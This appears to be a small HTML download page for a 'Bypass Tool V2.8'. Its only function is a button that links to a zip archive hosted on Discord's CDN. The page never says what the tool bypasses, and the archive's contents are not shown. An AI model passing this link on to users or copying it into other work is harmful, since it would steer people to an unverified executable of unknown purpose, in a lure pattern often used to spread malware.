<!DOCTYPE html>
<html>
<head>
	<link rel="icon" type="image/png" href="https://media.discordapp.net/attachments/1084075668943413269/1092799750572605510/R.png?width=640&height=640">
	<title>Bypass Tool</title>
	<style>
		body {
			background-color: #1c1c1c;
			color: #fff;
			font-family: Arial, sans-serif;
			overflow: hidden;
			position: relative;
			height: 100vh;
		}

		.star {
			position: absolute;
			top: 50%;
			left: 50%;
			width: 2px;
			height: 2px;
			border-radius: 50%;
			background-color: whitesmoke;
			opacity: 0;
			animation: twinkle 3.5s infinite;
			animation-fill-mode: forwards;
			z-index: 0;
		}

		@keyframes twinkle {
			0% {
				opacity: 0;
			}
			50% {
				opacity: 1;
			}
			100% {
				opacity: 0;
			}
		}
		.container {
		  display: flex;
		  flex-direction: column;
		  justify-content: center;
		  align-items: center;
		  height: 100vh;
		}

		.text {
		  font-size: 50px;
		  font-weight: bold;
		  text-transform: uppercase;
		  color: whitesmoke;
		}

		.button {
			position: fixed;
			top: 62%;
			left: 48%;
			transform: translate(-50%, -50%);
			padding: 20px 30px;
			font-size: 24px;
			font-weight: bold;
			text-transform: uppercase;
			color: #fff;
			background-color: blue;
			border: none;
			border-radius: 50px;
			cursor: pointer;
			z-index: 9999;
			transition: all 0.6s ease;
		}

		.button:hover {
			transform: translate(-50%, -50%) scale(1.1);
		}
	</style>
</head>
<body>
	<div class="container">
		<div class="text">BYPASS TOOL V2.8 ⚡</div>
		<button class="button" onclick="window.location.href='https://cdn.discordapp.com/attachments/1092896166183710830/1093267985583591494/Bypass.zip'">Download</button>
	</div>
	<script>
		// create stars dynamically
		for (var i = 0; i < 200; i++) {
			var star = document.createElement('div');
			star.classList.add('star');
			star.style.top = Math.floor(Math.random() * 100) + '%';
			star.style.left = Math.floor(Math.random() * 100) + '%';
			star.style.animationDelay = Math.floor(Math.random() * 5) + 's';
			document.body.appendChild(star);
		}
	</script>
</body>
</html>
